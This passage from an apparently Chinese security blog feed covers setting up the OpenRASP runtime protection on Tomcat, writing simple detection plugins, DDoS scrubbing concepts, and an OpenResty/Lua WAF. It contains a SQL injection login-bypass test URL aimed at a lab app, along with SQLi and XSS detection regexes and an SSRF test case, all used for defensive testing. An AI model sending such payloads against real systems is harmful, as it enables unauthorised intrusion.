class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/lib/tomcat7/db</span><br><span class="line">chown -R tomcat7:tomcat7 /var/lib/tomcat7/db</span><br></pre></td></tr></table></figure><p>登录后台，上传war包部署</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.X.X:8080/manager/html</span><br></pre></td></tr></table></figure><p>初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/wavsep/wavsep-install/install.jsp</span><br></pre></td></tr></table></figure><h1 id="OpenRASP安装"><a href="#OpenRASP安装" class="headerlink" title="OpenRASP安装"></a>OpenRASP安装</h1><p>先看看最新版的能不能行</p><p>下载 rasp-java.tar.gz 或者 rasp-java.zip 并解压缩。之后进入到解压后的目录中执行RaspInstall.jar</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/baidu/openrasp/releases/download/v1.3.7/rasp-java.zip</span><br><span class="line">unzip rasp-java.zip</span><br><span class="line">cd rasp-2022-01-28/</span><br><span class="line"># /usr/share/tomcat7是tomcat根目录，可以通过whereis tomcat7查看，一般是含有bin目录的</span><br><span class="line">java -jar RaspInstall.jar -install /usr/share/tomcat7</span><br></pre></td></tr></table></figure><p>下面就是安装成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/rasp-2022-01-28# java -jar RaspInstall.jar -install /usr/share/tomcat7</span><br><span class="line">OpenRASP Installer for Java app servers - Copyright 2017-2021 Baidu Inc.</span><br><span class="line">For more details visit: https://rasp.baidu.com/doc/install/software.html</span><br><span class="line"></span><br><span class="line">Detected JDK version: 1.8.0_292</span><br><span class="line">Detected application server type: Tomcat</span><br><span class="line">Duplicating &quot;rasp&quot; directory</span><br><span class="line">- /usr/share/tomcat7/rasp</span><br><span class="line">Make &quot;rasp&quot; directory writable</span><br><span class="line"></span><br><span class="line">Generating &quot;openrasp.yml&quot;</span><br><span class="line">- /usr/share/tomcat7/rasp/conf/openrasp.yml</span><br><span class="line">- Create /usr/share/tomcat7/rasp/conf/openrasp.yml</span><br><span class="line">Updating startup script</span><br><span class="line">- /usr/share/tomcat7/bin/catalina.sh</span><br><span class="line"></span><br><span class="line">Installation completed without errors.</span><br><span class="line">Please restart application server to take effect.</span><br></pre></td></tr></table></figure><p>之后重启tomcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面目录是官方的插件，用的nodejs写的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/usr/share/tomcat7/rasp/plugins# ls</span><br><span class="line">official.js</span><br></pre></td></tr></table></figure><p>下面链接是官方规则可以检测的漏洞类型，但有些是仅IAST商业版支持</p><p><a href="https://rasp.baidu.com/doc/usage/web.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/usage/web.html</a></p><p>不过默认没有开启阻断，需要编辑official.js开启，之后重启tomcat7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 若 all_log 开启，表示为观察模式，会将所有的 block 都改为 log</span><br><span class="line">        all_log: true,</span><br></pre></td></tr></table></figure><p>访问以下sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.XXX.XXX:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue%27%20or%207=7--%20&amp;password=textvalue2</span><br></pre></td></tr></table></figure><p>就会跳转到百度的页面</p><p><img src="http://pic.giantbranch.cn/pic/1697291133881.png" alt></p><h1 id="开发插件"><a href="#开发插件" class="headerlink" title="开发插件"></a>开发插件</h1><p>官方有文档</p><p><a href="https://rasp.baidu.com/doc/dev/example.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/dev/example.html</a></p><p>就是下nodejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y nodejs npm</span><br><span class="line">npm install -g openrasp</span><br></pre></td></tr></table></figure><p>一个最小的SQL检测插件如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const plugin_version = &apos;2018-1000-1000&apos;</span><br><span class="line">const plugin_name    = &apos;test-plugin&apos;</span><br><span class="line"></span><br><span class="line">&apos;use strict&apos;</span><br><span class="line">var plugin  = new RASP(plugin_name)</span><br><span class="line"></span><br><span class="line">const clean = &#123;</span><br><span class="line">    action:     &apos;ignore&apos;,</span><br><span class="line">    message:    &apos;Looks fine to me&apos;,</span><br><span class="line">    confidence: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// BEGIN ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">var algorithmConfig = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// END ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">plugin.register(&apos;sql&apos;, function (params, context) &#123;</span><br><span class="line">    plugin.log(&apos;SQL query: &apos; + params.query)</span><br><span class="line">    return clean</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">plugin.log(&apos;plugin-demo: plugin loaded&apos;)</span><br></pre></td></tr></table></figure><p>主要就是调用 plugin.register 注册了SQL查询的检测函数，并将SQL语句打印到插件日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params 为检查点提供的参数，如SQL语句、要读取的文件等等</span><br><span class="line">context 为请求信息，如请求参数，服务器信息等等</span><br></pre></td></tr></table></figure><p>检测函数return clean，其实就是放行，clean的action是ignore</p><p>而除了注册sql之外，还可以注册检测什么，可以看下面的链接</p><p><a href="https://rasp.baidu.com/doc/dev/data.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/dev/data.html</a></p><p>下面我随便列出一点</p><p>读取目录： directory<br>请求参数：request<br>删除文件：deleteFile<br>文件包含操作：include<br>文件上传：fileUpload<br>命令执行：command<br>代码执行（目前支持 eval/function 两种函数）：eval<br>响应检查：response</p><p>写好之后可以用上面装好的rasp库进行测试，可以参考这里：<a href="https://rasp.baidu.com/doc/dev/test/main.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/dev/test/main.html</a></p><p>测试用例以 JSON 格式保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">    &quot;id&quot;: &quot;ssrf_userinput_intranet&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;ssrf&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;block&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;hostname&quot;: &quot;172.16.177.120&quot;,</span><br><span class="line">        &quot;ip&quot;: [&quot;172.16.177.120&quot;],</span><br><span class="line">        &quot;url&quot;: &quot;http://172.16.177.120/hello.action?redirect=123&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;context&quot;: &#123;</span><br><span class="line">        &quot;parameter&quot;: &#123;</span><br><span class="line">            &quot;url&quot;: [&quot;http://172.16.177.120/hello.action?redirect=123&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;description&quot;: &quot;SSRF userinput match test&quot;</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>其中，action 表示期望的结果，是拦截、日志还是放行；id 是测试用例编号。其他字段主要是对请求上下文的模拟。</p><p>运行单元测试，需要两个关键参数</p><ul><li>测试用例目录，-d指定目录</li><li>检测插件路径，-p指定插件文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rasp check -d ./unitCases -p myplugin.js</span><br></pre></td></tr></table></figure><p>实例：</p><p>tests文件夹放的是sql.json，来源：<a href="https://raw.githubusercontent.com/baidu/openrasp/191aa2e5ed8b80f9a3580d3c64dccb0e425ef373/agent/java/engine/src/test/resources/pluginUnitTest/unitCases/sql.json" target="_blank" rel="noopener">https://raw.githubusercontent.com/baidu/openrasp/191aa2e5ed8b80f9a3580d3c64dccb0e425ef373/agent/java/engine/src/test/resources/pluginUnitTest/unitCases/sql.json</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">root@ubuntu:~# cat sql.js </span><br><span class="line">const plugin_version = &apos;2018-1000-1000&apos;</span><br><span class="line">const plugin_name    = &apos;test-plugin&apos;</span><br><span class="line"></span><br><span class="line">&apos;use strict&apos;</span><br><span class="line">var plugin  = new RASP(plugin_name)</span><br><span class="line"></span><br><span class="line">const clean = &#123;</span><br><span class="line">    action:     &apos;log&apos;,</span><br><span class="line">    message:    &apos;Looks fine to me&apos;,</span><br><span class="line">    confidence: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const attack = &#123;</span><br><span class="line">    action:     &apos;block&apos;,</span><br><span class="line">    message:    &apos;sql注入攻击，阻断&apos;,</span><br><span class="line">    confidence: 0</span><br><span class="line">&#125;</span><br><span class="line">// BEGIN ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">var algorithmConfig = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// END ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">plugin.register(&apos;sql&apos;, function (params, context) &#123;</span><br><span class="line">    if(/(union.*select|sleep)/i.test(params.query))</span><br><span class="line">    return attack</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">plugin.log(&apos;plugin-demo: plugin loaded&apos;)</span><br><span class="line">root@ubuntu:~# rasp check -d ./tests/ -p ./sql.js </span><br><span class="line"></span><br><span class="line">OpenRASP plugin devtool - https://rasp.baidu.com</span><br><span class="line">[test-plugin] plugin-demo: plugin loaded</span><br><span class="line"></span><br><span class="line">  ✓ sql.json Simple userinput match test: 3ms</span><br><span class="line">  ✓ sql.json SQL injection with hex values: 1ms</span><br><span class="line">  ✓ sql.json SQL injection with datetime methods: 0ms</span><br><span class="line"></span><br><span class="line">  3 passing (11ms)</span><br></pre></td></tr></table></figure><p>默认的规则好像检测不到Get参数的反射型xss，我写两个简单的，不过就检测一个script，大家可以完善，不过调试的时候，好像querystring是有url编码的，这个需要注意，不然<code>&lt;script</code>是检测不到的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">const plugin_version = &apos;2023-1015-1520&apos;</span><br><span class="line">const plugin_name    = &apos;xss-plugin&apos;</span><br><span class="line"></span><br><span class="line">&apos;use strict&apos;</span><br><span class="line">var plugin  = new RASP(plugin_name)</span><br><span class="line"></span><br><span class="line">var xssRegex = /script/i</span><br><span class="line"></span><br><span class="line">const clean = &#123;</span><br><span class="line">    action:     &apos;log&apos;,</span><br><span class="line">    message:    &apos;无风险&apos;,</span><br><span class="line">    confidence: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const attack = &#123;</span><br><span class="line">    action:     &apos;block&apos;,</span><br><span class="line">    message:    &apos;有攻击，阻断&apos;,</span><br><span class="line">    confidence: 95 </span><br><span class="line">&#125;</span><br><span class="line">// BEGIN ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">var algorithmConfig = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// END ALGORITHM CONFIG //</span><br><span class="line"></span><br><span class="line">plugin.register(&apos;request&apos;, function (params, context) &#123;</span><br><span class="line">    var querystring = context.querystring </span><br><span class="line">    var message = &quot;&quot;;</span><br><span class="line">    plugin.log(querystring)</span><br><span class="line">    if (xssRegex.test(querystring))&#123;</span><br><span class="line">        message = &quot;XSS攻击：&quot; + querystring </span><br><span class="line">        return attack</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! message.length) &#123;</span><br><span class="line">        return clean;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br><span class="line">plugin.log(&apos;xss-plugin plugin loaded&apos;)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《基于开源软件打造企业安全》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;应用实时防护（RASP）是一种现代的应用安全技术，它的原理是在应用程序运行时动态分析和监视应用程序的行为，以侦测和防止潜在的应用安全漏洞和攻击。RASP 技术通常被集成到应用程序代码中或应用程序服务器中，以实现实时的安全保护。以下是 RASP 技术的一般原理：&lt;/p&gt;
&lt;o
      
    
    </summary>
    
    
      <category term="RASP" scheme="https://www.giantbranch.cn/tags/RASP/"/>
    
      <category term="企业安全建设" scheme="https://www.giantbranch.cn/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>流量清洗与流量压制</title>
    <link href="https://www.giantbranch.cn/2023/10/11/%E6%B5%81%E9%87%8F%E6%B8%85%E6%B4%97%E4%B8%8E%E6%B5%81%E9%87%8F%E5%8E%8B%E5%88%B6/"/>
    <id>https://www.giantbranch.cn/2023/10/11/流量清洗与流量压制/</id>
    <published>2023-10-11T00:00:00.000Z</published>
    <updated>2023-11-06T00:50:18.394Z</updated>
    
    <content type="html"><![CDATA[<p>这两个都是DDos防护中的概念，看着很高大上，那么GPT会怎么说这两个东西嗯</p><h1 id="流量清洗"><a href="#流量清洗" class="headerlink" title="流量清洗"></a>流量清洗</h1><p>流量清洗是一种网络安全和数据管理技术，用于识别、过滤和处理网络流量中的异常、恶意或不良数据。这项技术通常由网络服务提供商、数据中心、云服务提供商和企业使用，以维护网络的安全性、性能和可用性。</p><p>实际上，流量清洗执行以下任务：</p><ol><li><p><strong>检测和过滤恶意流量</strong>：流量清洗系统能够检测和过滤包括病毒、恶意软件、僵尸网络攻击、分布式拒绝服务攻击（DDoS）和其他网络攻击形式的恶意流量。它们通过分析流量中的模式、行为和签名来实现此目标。</p></li><li><p><strong>保护网络安全</strong>：流量清洗有助于防止网络威胁，确保关键网络资源和服务的安全。这对于保护网络免受未经授权的访问和攻击非常重要。</p></li><li><p><strong>提高网络性能</strong>：流量清洗可以帮助过滤掉非必要或恶意的流量，从而减轻网络带宽压力，提高网络性能，确保合法流量能够正常传递。</p></li><li><p><strong>维护服务可用性</strong>：通过阻止 DDoS 攻击和其他网络攻击，流量清洗有助于确保网络服务的可用性。这对于在线服务提供商、电子商务网站和其他依赖于持续在线性能的组织非常重要。</p></li><li><p><strong>合规性和监控</strong>：流量清洗也用于监控网络活动，帮助组织遵守法规和监管要求。它提供了数据审计和记录功能，以便在需要时审查网络活动。</p></li><li><p><strong>数据优化</strong>：一些流量清洗解决方案还可以帮助优化数据传输，减少数据冗余和传输时延，从而提高网络效率。</p></li></ol><p>总结：就是不让一些恶意流量直接送到我们要防护的服务器，当然一般不能阻止攻击的流量</p><p>那么代码是怎么实现的呢</p><p>以下是一个伪代码示例，演示了如何基本实现流量清洗。请注意，这只是一个简化的示例，实际的流量清洗系统会更复杂和高级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伪代码示例 - 简单的流量清洗</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个列表，用于存储已知的恶意 IP 地址</span></span><br><span class="line">malicious_ips = [<span class="string">"192.168.1.100"</span>, <span class="string">"10.0.0.2"</span>, ...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收传入的网络流量数据包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_packet</span><span class="params">(packet)</span>:</span></span><br><span class="line">    source_ip = packet.source_ip</span><br><span class="line">    destination_ip = packet.destination_ip</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查源 IP 是否在已知的恶意 IP 列表中</span></span><br><span class="line">    <span class="keyword">if</span> source_ip <span class="keyword">in</span> malicious_ips:</span><br><span class="line">        log(<span class="string">"恶意流量：拦截数据包从 "</span> + source_ip + <span class="string">" 到 "</span> + destination_ip)</span><br><span class="line">        drop_packet(packet)  <span class="comment"># 丢弃数据包</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        forward_packet(packet)  <span class="comment"># 正常转发数据包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 丢弃数据包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop_packet</span><span class="params">(packet)</span>:</span></span><br><span class="line">    <span class="comment"># 丢弃数据包，不进行进一步处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常转发数据包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward_packet</span><span class="params">(packet)</span>:</span></span><br><span class="line">    <span class="comment"># 将数据包发送到目标，可能会对数据包进行进一步处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录事件到日志</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="comment"># 记录事件信息到日志文件</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主循环 - 监听传入流量</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    packet = receive_packet_from_network()  <span class="comment"># 从网络接收数据包</span></span><br><span class="line">    receive_packet(packet)  <span class="comment"># 处理数据包</span></span><br></pre></td></tr></table></figure><p>这个简单的伪代码示例演示了一个基本的流量清洗系统，它检查传入数据包的源 IP 地址，如果源 IP 在已知的恶意 IP 列表中，就会丢弃该数据包。否则，它会将数据包正常转发。这是一个非常简化的示例，实际的流量清洗系统会更加复杂，包括更多的安全策略和功能，以及对各种网络协议和数据类型的支持。</p><h1 id="流量压制"><a href="#流量压制" class="headerlink" title="流量压制"></a>流量压制</h1><p>这个一般是运营商才能干，比如电信的云堤，直接在骨干网的设备对流量进行处理</p><p>根据<a href="https://damddos.com/products/ddos" target="_blank" rel="noopener">中国电信安全官网</a>描述：</p><p>流量压制是利用中国电信作为基础运营商对互联网“手术刀式”的流量调度能力，通过发布黑洞路由，丢弃来自网络特定方向所有去往该客户IP地址（段）的流量，快速应对超大规模攻击。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这两个都是DDos防护中的概念，看着很高大上，那么GPT会怎么说这两个东西嗯&lt;/p&gt;
&lt;h1 id=&quot;流量清洗&quot;&gt;&lt;a href=&quot;#流量清洗&quot; class=&quot;headerlink&quot; title=&quot;流量清洗&quot;&gt;&lt;/a&gt;流量清洗&lt;/h1&gt;&lt;p&gt;流量清洗是一种网络安全和数据管理
      
    
    </summary>
    
    
      <category term="ddos" scheme="https://www.giantbranch.cn/tags/ddos/"/>
    
  </entry>
  
  <entry>
    <title>自建WAF系统</title>
    <link href="https://www.giantbranch.cn/2023/10/04/%E8%87%AA%E5%BB%BAWAF%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.giantbranch.cn/2023/10/04/自建WAF系统/</id>
    <published>2023-10-04T00:00:00.000Z</published>
    <updated>2023-11-06T00:50:17.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><blockquote><p>Ubuntu20.04<br>openresty-1.21.4.2</p></blockquote><h1 id="OpenResty简介"><a href="#OpenResty简介" class="headerlink" title="OpenResty简介"></a>OpenResty简介</h1><p>OpenResty 是一个基于 Nginx 的 Web 应用服务器，它将 Nginx 与一组强大的 Lua 模块集成在一起，提供了高性能、可扩展和灵活的 Web 开发环境。OpenResty 的目标是通过编写简洁的 Lua 代码来构建高性能的 Web 应用，而无需额外的服务器端脚本语言。</p><p>OpenResty 提供了丰富的 Lua 库和模块，可以与各种第三方服务和数据库进行交互，如 MySQL、Redis、Memcached 等，从而实现复杂的业务逻辑和数据处理。通过 Lua 脚本的编写，您可以在请求的不同阶段对请求进行处理、路由、验证、转发等操作，以及对响应进行过滤、修改等操作。</p><p>OpenResty 的优势主要有以下几点：</p><ol><li><p>高性能：OpenResty 基于 Nginx，继承了其高性能、高并发处理能力和低资源消耗特点。同时，通过使用 Lua 进行自定义的请求处理和响应生成，可以进一步提高应用的性能。</p></li><li><p>可扩展：OpenResty 提供了丰富的 Lua 库和模块，可以轻松地扩展功能，从而满足不同业务场景的需求。借助这些扩展，您可以快速构建出符合自己业务需求的定制化 Web 服务器。</p></li><li><p>灵活性：OpenResty 提供了灵活的配置和编程方式，可以在全局层面和请求处理阶段进行高度定制。您可以根据需要对请求和响应进行精细控制，实现个性化的处理逻辑。</p></li><li><p>社区支持：OpenResty 拥有庞大的用户社区和开发者社区，提供了大量的资源、插件和示例代码，方便开发者学习和交流。</p></li></ol><p>总之，OpenResty 是一个功能强大且易于使用的 Web 应用服务器，它通过集成 Nginx 和 Lua，提供了一种高性能、可扩展和灵活的方式来构建 Web 应用。无论是构建 API 服务、处理静态文件、实现反向代理还是构建微服务架构，OpenResty 都是一个值得考虑的选择。</p><h1 id="OpenResty下载与编译"><a href="#OpenResty下载与编译" class="headerlink" title="OpenResty下载与编译"></a>OpenResty下载与编译</h1><p>安装依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp;  apt install libpcre3-dev libssl-dev perl make build-essential curl zlib1g-dev</span><br></pre></td></tr></table></figure><p>下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://openresty.org/download/openresty-1.21.4.2.tar.gz</span><br></pre></td></tr></table></figure><p>解压安装编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf openresty-VERSION.tar.gz</span><br><span class="line">cd openresty-VERSION/</span><br><span class="line">./configure -j2</span><br><span class="line">make -j2</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line"># better also add the following line to your ~/.bashrc or ~/.bash_profile file.</span><br><span class="line">export PATH=/usr/local/openresty/bin:/usr/local/openresty/nginx/sbin:$PATH</span><br></pre></td></tr></table></figure><p>或者假如是Ubuntu可以直接根据官方文档，添加仓库，直接apt安装</p><h1 id="安装unixhot-waf"><a href="#安装unixhot-waf" class="headerlink" title="安装unixhot waf"></a>安装unixhot waf</h1><p>下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/unixhot/waf.git</span><br></pre></td></tr></table></figure><p>将里面waf文件夹复制到Nginx配置文件目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp -rf waf /usr/local/openresty/nginx/conf/</span><br><span class="line">ln -s /usr/local/openresty/lualib/resty/ /usr/local/openresty/nginx/conf/waf/resty</span><br></pre></td></tr></table></figure><p>修改nginx配置文件nginx.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># WAF</span><br><span class="line">  lua_shared_dict limit 50m;</span><br><span class="line">  lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;;</span><br><span class="line">  init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;;</span><br><span class="line">  access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;</span><br></pre></td></tr></table></figure><p>这段 nginx 配置主要是实现使用 OpenResty 的 WAF (Web Application Firewall) 应用。具体含义如下：</p><ol><li><p>lua_shared_dict limit 50m;：定义了名为 limit 的共享字典，大小为 50MB，这个共享字典是用来存储限流、计数等信息的。</p></li><li><p>lua_package_path “/usr/local/openresty/nginx/conf/waf/?.lua”;：定义了 Lua 脚本的搜索路径，这里是在 /usr/local/openresty/nginx/conf/waf/ 目录下寻找 Lua 文件。</p></li><li><p>init_by_lua_file “/usr/local/openresty/nginx/conf/waf/init.lua”;：在 Nginx 启动时执行一次 init.lua 脚本，主要完成 WAF 初始化操作。</p></li><li><p>access_by_lua_file “/usr/local/openresty/nginx/conf/waf/access.lua”;：在处理请求时，先执行 access.lua 脚本，主要完成 WAF 的访问控制功能。</p></li></ol><h1 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h1><p>Nginx+Lua WAF很重要的一个基础功能，即反向代理功能</p><p>一般通过Location里面添加 proxy_pass来实现</p><p>这里我本地实验，就不用反向代理了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_pass https://www.XXX.com/;</span><br></pre></td></tr></table></figure><h1 id="基于Nginx-Lua得WAF"><a href="#基于Nginx-Lua得WAF" class="headerlink" title="基于Nginx+Lua得WAF"></a>基于Nginx+Lua得WAF</h1><p>WAF得配置在config.lua中</p><p>从access.lua可以看出检测的顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 